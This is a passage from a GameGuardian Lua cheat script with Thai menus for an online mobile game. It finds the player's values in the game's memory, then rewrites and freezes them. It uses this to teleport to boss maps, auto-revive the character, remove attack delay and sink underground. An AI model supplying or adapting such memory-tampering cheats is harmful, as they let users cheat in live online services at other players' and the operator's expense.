    if MG [1] == true then
      HOME()
    end
    if MG [2] == true then
      HOME()
    end
  end
  homedm= -1
end

function MN3() --📂 ชุด
ML = gg.multiChoice({
           ""▲เรทโลกอาจารย์โอริเทียส"",
           ""มัลตี้"",
           ""กาชาโดโรโร"",
           ""วิซาร์ด"",
           ""ฟรีเดอร์"",
           ""แมงมุมขวาน"",
           ""หน้าต่อไป"",
           ""❎ ก ลั บ ❎""
}, nil, ""แผนที่บอส หน้าที่3 📜\nเวอร์ชั่น ออนไลน์ 🌐"")
  if ML == nil then
  else
    if ML [1] == true then
      ML7()
    end
    if ML [2] == true then
     ML8()
    end 
    if ML [3] == true then
     ML9()
    end
    if ML [4] == true then
     ML10()
    end
    if ML [5] == true then
     ML11()
    end
    if ML [6] == true then
     ML12()
    end
    if ML [7] == true then
      MN4()
    end
    if ML [8] == true then
      MN1()
    end
  end
  homedm= -1
end
--------------------------------------------------------------------------------
function ML7()
    	while(true)
		do
		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)
 
gg.sleep(3000)

          bot[1].value = 102795
           auth1[1].value = 17500
          auth1[1].freeze = false
			auth2[1].value = 33600
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)        
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)
 
          rst[1].value = 0
          rst[1].freeze = true
            gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 24320) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	
		end
   gg.sleep(100)
end

function ML8()
        while(true)
        do
           rst[1].value = 0
           rst[1].freeze = false
            gg.setValues(rst)
          gg.addListItems(rst)
 
            bot[1].value = 71900
            bot[1].freeze = false
            auth1[1].value = 14080
          auth1[1].freeze = false
            auth2[1].value = 20480
          auth2[1].freeze = false
            gg.setValues(auth1)
            gg.setValues(auth2)
            gg.setValues(bot)
            rst[1].value = 16842752 
            gg.setValues(rst)
 
gg.sleep(3000)
 
          bot[1].value = 47460
            bot[1].freeze = false
            auth1[1].value = 5632
          auth1[1].freeze = false
            auth2[1].value = 10752
          auth2[1].freeze = false
            gg.setValues(auth1)
            gg.setValues(auth2)
            gg.setValues(bot)
            rst[1].value = 16842752 
            gg.setValues(rst)
 
gg.sleep(3500)
 
          bot[1].value = 47490
            bot[1].freeze = false
            auth1[1].value = 7936
          auth1[1].freeze = false
            auth2[1].value = 20480
          auth2[1].freeze = false
            gg.setValues(auth1)
            gg.setValues(auth2)
            gg.setValues(bot)
            rst[1].value = 16842752 
            gg.setValues(rst) 
 
gg.sleep(4500)
 
          rst[1].value = 0
          rst[1].freeze = true
            gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")
 
auth2 = gg.getValues(auth2)
    while(auth2[1].value ~= 13312) 
            do
                auth2 = gg.getValues(auth2)
                gg.sleep(100)
             end
        gg.sleep(100)   
        end
   gg.sleep(100)
end

function ML9()
while(true)
		do
		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4500)

          bot[1].value = 103591
           auth1[1].value = 6656
          auth1[1].freeze = false
			auth2[1].value = 11776
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)        
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)

          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 11520) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	
		end
   gg.sleep(100)
end

function ML10()
while(true)
		do
		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 47060
           auth1[1].value = 6656
          auth1[1].freeze = false
			auth2[1].value = 11776
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)        
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 47090
           auth1[1].value = 6912
          auth1[1].freeze = false
			auth2[1].value = 30976
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)        
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)

          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 15360) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	
		end
   gg.sleep(100)
end

function ML11()
while(true)
		do
		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 53960
           auth1[1].value = 5700
          auth1[1].freeze = false
			auth2[1].value = 12300
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)        
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 53990
           auth1[1].value = 5700
          auth1[1].freeze = false
			auth2[1].value = 12300
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)        
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)

          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 8192) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	
		end
   gg.sleep(100)
end

function ML12()
while(true)
		do
		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 52560
           auth1[1].value = 14000
          auth1[1].freeze = false
			auth2[1].value = 24000
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)        
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 52590
           auth1[1].value = 14000
          auth1[1].freeze = true
			auth2[1].value = 24000
          auth2[1].freeze = true
			gg.setValues(auth1)
			gg.setValues(auth2)        
			bot[1].freeze = true
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)


gg.sleep(4000)
           
           auth1[1].value = 14000
          auth1[1].freeze = true
			auth2[1].value = 24000
          auth2[1].freeze = true
			gg.setValues(auth1)
			gg.setValues(auth2)        
          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 8192) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	
		end
   gg.sleep(100)
end

function MN4() --📂 ชุด
ML = gg.multiChoice({
           ""เมโดนา"",
           ""ดอปกาซาเสือ"",
           ""อีวิล ดราก้อน เลเวียม"",
           ""รูดอล์ฟ"",
           ""เซาโร 170 🧓🏻"",
           ""เชลค์"",
           ""หน้าต่อไป"",
           ""❎ ก ลั บ ❎""
}, nil, ""แผนที่บอส หน้าที่4 📜\nเวอร์ชั่น ออนไลน์ 🌐"")
  if ML == nil then
  else
    if ML [1] == true then
      ML13()
    end
    if ML [2] == true then
     ML14()
    end 
    if ML [3] == true then
     ML15()
    end
    if ML [4] == true then
     ML16()
    end
    if ML [5] == true then
     ML17()
    end
    if ML [6] == true then
     ML18()
    end
    if ML [7] == true then
     MN5()
    end
    if ML [8] == true then
     MN1()
    end
  end
  homedm= -1
end

function ML13()
gg.clearResults()
r = {""-104""}
gg.setRanges(gg.REGION_JAVA_HEAP)
gg.searchNumber(""11001"" , gg.TYPE_DWORD)
gg.refineNumber(""11001"", gg.TYPE_DWORD)
q = gg.getResults(1)

for i = 1,#r do
            p = {}
			p[i] = {}
		    p[i].address = q[1].address + r[i]
			p[i].flags = 4 
			p[i].value = 0
			p[i].freeze = true
			gg.addListItems(p)
			gg.setValues(p)
			gg.addListItems(p)
	end	
gg.clearResults()

    	while(true)
		do

		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 77160
			bot[1].freeze = false
			auth1[1].value = 13000
          auth1[1].freeze = false
			auth2[1].value = 25000
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)
 
gg.sleep(3500)

          bot[1].value = 77190
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)

          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 23552) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	

		end
   gg.sleep(100)
end

------------------------------------------------------------------------------------------------------

function ML14()  ---------------------------------------------------
gg.clearResults()
r = {""-104""}
gg.setRanges(gg.REGION_JAVA_HEAP)
gg.searchNumber(""11001"" , gg.TYPE_DWORD)
gg.refineNumber(""11001"", gg.TYPE_DWORD)
q = gg.getResults(1)

for i = 1,#r do
            p = {}
			p[i] = {}
		    p[i].address = q[1].address + r[i]
			p[i].flags = 4 
			p[i].value = 0
			p[i].freeze = true
			gg.addListItems(p)
			gg.setValues(p)
			gg.addListItems(p)
	end	
gg.clearResults()

    	while(true)
		do

		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)

          bot[1].value = 104760
			bot[1].freeze = false
			auth1[1].value = 13000
          auth1[1].freeze = false
			auth2[1].value = 25000
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)
 
gg.sleep(4000)

          bot[1].value = 77190
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)

          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 23552) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	

		end
   gg.sleep(100)
end



function ML15()
    	while(true)
		do

		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 40860
			bot[1].freeze = false
			auth1[1].value = 32400
          auth1[1].freeze = false
			auth2[1].value = 27000
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)
 
gg.sleep(3500)

          bot[1].value = 40890
			bot[1].freeze = false
			auth1[1].value = 32400
          auth1[1].freeze = false
			auth2[1].value = 27000
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)

          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 14592) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	

		end
   gg.sleep(100)
end

function ML16()
gg.clearResults()
r = {""-104""}
gg.setRanges(gg.REGION_JAVA_HEAP)
gg.searchNumber(""11001"" , gg.TYPE_DWORD)
gg.refineNumber(""11001"", gg.TYPE_DWORD)
q = gg.getResults(1)
 
for i = 1,#r do
            p = {}
            p[i] = {}
            p[i].address = q[1].address + r[i]
            p[i].flags = 4 
            p[i].value = 0
            p[i].freeze = true
            gg.addListItems(p)
            gg.setValues(p)
            gg.addListItems(p)
    end 
gg.clearResults()
    	
       while(true)
		do

		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 75960
			bot[1].freeze = false
			auth1[1].value = 9000
          auth1[1].freeze = false
			auth2[1].value = 9000
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)
 
gg.sleep(3500)

          bot[1].value = 75990
			bot[1].freeze = false
			auth1[1].value = 10240
          auth1[1].freeze = false
			auth2[1].value = 20224
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)

          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 9472) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	

		end
   gg.sleep(100)
end

function ML17()
while(true)
		do
		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

            top[1].flags = gg.TYPE_DWORD
            top[1].value = 0
            top[1].freeze = true
            top[1].freezeType = gg.FREEZE_IN_RANGE
            top[1].freezeFrom = 5462
            top[1].freezeTo = 5492
          bot[1].value = 5462
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 5492          
           auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)        
			bot[1].freeze = false
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)

          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 9984) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	
		end
   gg.sleep(100)
end

function ML18()
gg.clearResults()
r = {""-104""}
gg.setRanges(gg.REGION_JAVA_HEAP)
gg.searchNumber(""11001"" , gg.TYPE_DWORD)
gg.refineNumber(""11001"", gg.TYPE_DWORD)
q = gg.getResults(1)
 
for i = 1,#r do
            p = {}
            p[i] = {}
            p[i].address = q[1].address + r[i]
            p[i].flags = 4 
            p[i].value = 0
            p[i].freeze = false
            gg.addListItems(p)
            gg.setValues(p)
            gg.addListItems(p)
    end 
gg.clearResults()
    	
       while(true)
		do

		   rst[1].value = 0
		   rst[1].freeze = false
			gg.setValues(rst)
          gg.addListItems(rst)

			bot[1].value = 71900
			bot[1].freeze = false
			auth1[1].value = 14080
          auth1[1].freeze = false
			auth2[1].value = 20480
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(3000)

          bot[1].value = 45460
			bot[1].freeze = false
			auth1[1].value = 13312
          auth1[1].freeze = false
			auth2[1].value = 15872
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)
 
gg.sleep(3500)

          bot[1].value = 45490
			bot[1].freeze = false
			auth1[1].value = 16128
          auth1[1].freeze = false
			auth2[1].value = 25000
          auth2[1].freeze = false
			gg.setValues(auth1)
			gg.setValues(auth2)
			gg.setValues(bot)
			rst[1].value = 16842752 
			gg.setValues(rst)

gg.sleep(4000)

          rst[1].value = 0
          rst[1].freeze = true
			gg.setValues(rst)
          gg.addListItems(rst)
          gg.toast(""เสร็จ 🎲"")

auth2 = gg.getValues(auth2)
	while(auth2[1].value ~= 18432) 
			do
				auth2 = gg.getValues(auth2)
				gg.sleep(100)
			 end
        gg.sleep(100)	

		end
   gg.sleep(100)
end
--------------------------------------------------------------------------------



------------------------------------------------------------------------------


-------------------  C o m p o s i t i o n  -------------------

---เปิดก่อน---
function OPEN()
A = gg.choice({""ใช่"",""เสร็จสิ้น"",""🌊ก ลั บ""},nil,""\n▄▀█ █░░ █░░   █ █▄░█\n█▀█ █▄▄ █▄▄   █ █░▀█\n\nคุณอยู่ในหน้าเลือกตัวละครหรือไม่?\nกดเสร็จสิ้นสำหรับหน้าถัดไป📊"")
if A == 1 then TWO() end
--if A == 2 then HOME() gg.sleep(500) gg.processKill() end
if A == 2 then MN2()end
if A == 3 then HOME()end
end

--2000--
function TWO()
gg.setRanges(gg.REGION_JAVA_HEAP)
gg.searchNumber(""2000;1~1000F::65"", gg.TYPE_DWORD, false, gg.SING_EQUAL, 0, -1)
gg.refineNumber(""2000"", gg.TYPE_DWORD, false, gg.SING_EQUAL, 0, -1)
revert = gg.getResults(1, nil, nil, nil, nil, nil, nil, nil, nil)
local w = gg.getResults(1, nil, nil, nil, nil, nil, nil, nil, nil)
for i, v in ipairs(w) do
	if v.flags == gg.TYPE_DWORD then
		v.value = ""2000""
		v.freeze = true
	end
end
gg.addListItems(w)
gg.toast(""เสร็จสิ้น⛅"")
gg.clearResults()
end


------------------------------------------------------------------------------
-------------------  M e n u L o b b y  -------------------

function sh() --📂 menu Lobby
MG = gg.multiChoice({
""1.ตายเกิด 👻"" ,
""2.ลบดีเล+โจมตีเร็ว 🔪"" ,
""3.ดำดิน 🚄"",
},nil,""⚠️สคริปต์นี้สร้างขึ้นสำหรับ VMOS เวอร์ชัน 5.1⚠️"")
  if MG == nil then
  else 
    if MG [1] == true then RE55() end
    if MG [2] == true then D1() A1() A2() end
    if MG [3] == true then DN() end
    end
  homedm= -1
end

-----------------------------------------------------------------

function DN()
gg.setRanges(gg.REGION_JAVA_HEAP)
gg.searchNumber(""0.1"", gg.TYPE_FLOAT, false, gg.SING_EQUAL, 0, -1)
revert = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
gg.editAll(""0"", gg.TYPE_FLOAT)
gg.clearResults()
gg.toast('เสร็จสิ้น⛅')
end

-----------------------------------------------------------------

function RE55() 
gg.setRanges(gg.REGION_JAVA_HEAP)
gg.searchNumber(""41;41;180:21"",gg.TYPE_DWORD)
gg.refineNumber(""180"",gg.TYPE_DWORD)
t = gg.getResults(1)
for i, v in ipairs(t) do
	if v.flags == gg.TYPE_DWORD then
		v.value = ""-1""
		v.freeze = true
	end
	end
gg.addListItems(t) 
t = nil
gg.clearResults()
gg.toast(""คืนชีพอัตโนมัติ💀"")
end

-----------------------------------------------------------------

function D1()
gg.searchNumber(""2000;0;0;0;1~1000F::65"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
gg.refineNumber(""0"", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
revert = gg.getResults(6, nil, nil, nil, nil, nil, nil, nil, nil)
local t = gg.getResults(6, nil, nil, nil, nil, nil, nil, nil, nil)
for i, v in ipairs(t) do
	if v.flags == gg.TYPE_DWORD then
		v.value = ""0""
		v.freeze = true
	end
end
gg.addListItems(t)
t = nil

gg.clearResults()
end

-----------------------------------------------------------------

function A1()
gg.clearResults()
r = {""4""}
gg.setRanges(gg.REGION_JAVA_HEAP)
gg.searchNumber(""2000;1~1000F::65"" , gg.TYPE_DWORD)
gg.refineNumber(""1~1000"", gg.TYPE_FLOAT)
q = gg.getResults(1)

for i = 1,#r do
            p = {}
			p[i] = {}
		    p[i].address = q[1].address + r[i]
			p[i].flags = gg.TYPE_FLOAT
			p[i].value = 0
			p[i].freeze = true
			gg.setValues(p)
			gg.addListItems(p)
	end	
		gg.clearResults()
gg.clearResults()	
end

function A2()
gg.clearResults()
r = {""-24""}
gg.setRanges(gg.REGION_JAVA_HEAP)
gg.searchNumber(""2000;1~1000F::65"" , gg.TYPE_DWORD)
gg.refineNumber(""1~1000"", gg.TYPE_FLOAT)
q = gg.getResults(1)

for i = 1,#r do
            p = {}
			p[i] = {}
		    p[i].address = q[1].address + r[i]
			p[i].flags = gg.TYPE_DWORD
			p[i].value = 0
			p[i].freeze = true
			p[i].freezeType = gg.FREEZE_IN_RANGE
			p[i].freezeFrom = -250
			p[i].freezeTo = 1
			gg.setValues(p)
			gg.addListItems(p)
	end	
		gg.clearResults()
gg.clearResults()	
gg.toast('เสร็จสิ้น⛅\n⠀⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀⢠⠞⠉⠙⠲⡀⠀\n⠀⠀⠀⣴⠿⠏⠀⠀⠀⠀⠀⠀⢳⡀⠀⡏⠀⠀⠀⠀⠀⢷\n⠀⠀⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀⣧⠀⢸⠀⠀⠀⠀⠀ ⡇\n⠀⠀⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲⣿⠀⣸⠀⠀OK⠀ ⡇\n⠀⠀⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀⠀⣿⠀⢹⠀⠀⠀⠀⠀ ⡇\n⠀⠀⠙⢿⣯⠄⠀⠀⠀⢀⡀⠀⠀⡿⠀⠀⡇⠀⠀⠀⠀⡼\n⠀⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀⡴⠃⠀⠀⠘⠤⣄⣠⠞⠀\n⠀⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀⠀⠀⠀⠀⠀⠀\n⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿⠀⠀⠀⠀⠀⠀\n⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀⠀⣄⢸⠀⠀⠀⠀⠀⠀\n⣿⣿⣧⣀⣿………⣀⣰⣏⣘⣆⣀') 
end


------------------------------------------------------------------------------

function Nextto() --Home menu
A = gg.choice({
           ""หน้าที่2"",
           ""หน้าที่3"",
           ""หน้าที่4"",
           ""หน้าที่5 (ยังไม่เพิ่ม)"",
           ""หน้าที่6 (ยังไม่เพิ่ม)"",
           ""❎ ก ลั บ ❎""
}, nil, ""แผนที่บอส หน้าต่างๆ 🗃️\nเวอร์ชั่น ออนไลน์ 🌐"")
    if A == nil then
  else
    if A == 1 then
      MN2()
    end
    if A == 2 then
      MN3()
    end
    if A == 3 then
      MN4()
    end
    if A == 4 then
     PG4()
    end
    if A == 5 then
     PG5()
    end
    if A == 6 then
      MN1()
    end
  end
  homedm= -1
end

------------------------------------------------------------------------------

function lm()
gg.clearResults()
r = {""-104""}
gg.setRanges(gg.REGION_JAVA_HEAP)
gg.searchNumber(""11001"" , gg.TYPE_DWORD)
gg.refineNumber(""11001"", gg.TYPE_DWORD)
q = gg.getResults(1)
 
for i = 1,#r do
            p = {}
            p[i] = {}
            p[i].address = q[1].address + r[i]
            p[i].flags = 4 
            p[i].value = 0
            p[i].freeze = false
            gg.addListItems(p)
            gg.setValues(p)
            gg.addListItems(p)
    end 
gg.clearResults()

gg.clearResults()
gg.setRanges(gg.REGION_JAVA_HEAP)
	gg.searchNumber(""11001"" , gg.TYPE_DWORD)
	gg.refineNumber(""11001"", gg.TYPE_DWORD)
	q = gg.getResults(1)

	base[1] = {}
	base[1].name = ""base""
	base[1].address = q[1].address
	base[1].flags = q[1].flags
	base[1].value = q[1].value
	base[1].freeze = false
	gg.addListItems(base) 

	top[1] = {}
	top[1].name = ""top""
	top[1].address = q[1].address - 104
	top[1].flags = q[1].flags
	top[1].value = q[1].value
	top[1].freeze = false
	gg.addListItems(top) 

	bot[1] = {}
	bot[1].name = ""bot""
	bot[1].address = q[1].address - 100
	bot[1].flags = q[1].flags
	bot[1].value = q[1].value
	bot[1].freeze = false
	gg.addListItems(bot)
	
	auth1[1] = {}
	auth1[1].name = ""auth1""
	auth1[1].address = q[1].address - 88
	auth1[1].flags = q[1].flags
	auth1[1].value = q[1].value
	auth1[1].freeze = false
	gg.addListItems(auth1)
	
	auth2[1] = {}
	auth2[1].name = ""auth2""
	auth2[1].address = q[1].address - 84
	auth2[1].flags = q[1].flags
	auth2[1].value = q[1].value
	auth2[1].freeze = false
	gg.addListItems(auth2) 

	rst[1] = {}
	rst[1].name = ""rst""
	rst[1].address = q[1].address + 204
	rst[1].flags = q[1].flags
	rst[1].value = q[1].value
	rst[1].freeze = false
	gg.addListItems(rst) 
	gg.clearResults()
	gg.toast(""โหลดแผนที่เรียบร้อย 🔍"")
end

function vm()
gg.clearResults()
r = {""-88""}
gg.setRanges(gg.REGION_JAVA_HEAP)
gg.searchNumber(""11001"" , gg.TYPE_DWORD)
gg.refineNumber(""11001"", gg.TYPE_DWORD)
q = gg.getResults(1)

for i = 1,#r do
            p = {}
			p[i] = {}
		    p[i].address = q[1].address + r[i]
			p[i].flags = 4 
			p[i].value = 14080
			p[i].freeze = false
			gg.setValues(p)
			gg.addListItems(p) 
	end	

r = {""-84""}
for i = 1,#r do
            p = {}
			p[i] = {}
		    p[i].address = q[1].address + r[i]
			p[i].flags = 4 
			p[i].value = 20480
			p[i].freeze = false
			gg.setValues(p)
			gg.addListItems(p) 
	end	
r = {""-100""}
for i = 1,#r do
            p = {}
			p[i] = {}
		    p[i].address = q[1].address + r[i]
			p[i].flags = 4 
			p[i].value = 71900
			p[i].freeze = false
			gg.setValues(p)
	end	
	r = {""204""}
for i = 1,#r do
            p = {}
			p[i] = {}
		    p[i].address = q[1].address + r[i]
			p[i].flags = 4 
			p[i].value = 999999
			p[i].freeze = false
			gg.setValues(p)
            gg.clearResults()
            gg.toast(""แผนที่ป้องกันไวรัส 🛡️"")
	end	
end

function EXIT()
print(""🌊อิรูนา อีดิชั่น 🌬️\nเวอร์ชั่น ออนไลน์ 🌐\nจัดทำโดย ZirconX-Newt 🎃\nขอขอบคุณที่ใช้งาน"")
  gg.skipRestoreState()
  gg.setVisible(true)
  os.exit()
end


------------------------------------------------------------------
while(true)
do
if gg.isVisible(true) 
then
homedm=1 gg.setVisible(false) end
if homedm==1 then menu() end
end
